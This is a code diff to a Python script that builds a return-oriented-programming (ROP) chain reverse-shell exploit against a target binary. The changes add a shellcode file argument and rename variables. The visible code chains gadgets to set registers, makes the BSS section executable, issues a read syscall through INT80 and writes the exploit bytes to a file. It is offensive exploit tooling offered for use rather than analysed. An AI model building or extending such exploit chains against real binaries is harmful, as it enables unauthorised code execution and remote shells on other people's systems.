@@ -34,7 +34,7 @@ def schedule(commands):
     print("No valid order!")
     return -1
 
-def rop_exploit(binary_name):
+def rop_exploit(binary_name, shellcode_name):
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
@@ -63,14 +63,13 @@ def rop_exploit(binary_name):
 
     print("Made BSS executable")
 
-
     # # Read into BSS
     commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                 "ebx" : push_to_reg(0,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
                 "edx" : push_to_reg(0xffffffff,"edx",gadgets,rop)}
 
-    
+
     exploit += schedule(commands)
     exploit += INT80
 
@@ -88,10 +87,11 @@ def main():
         exit(1)
 
     binary_name = sys.argv[1]
-    fileName=sys.argv[2]
+    file_name=sys.argv[2]
+    shellcode_name = sys.argv[3]
 
-    outfile=open(fileName, "wb")
-    outfile.write(rop_exploit(binary_name))
+    outfile=open(file_name, "wb")
+    outfile.write(rop_exploit(binary_name, shellcode_name))
     outfile.close()
 
 
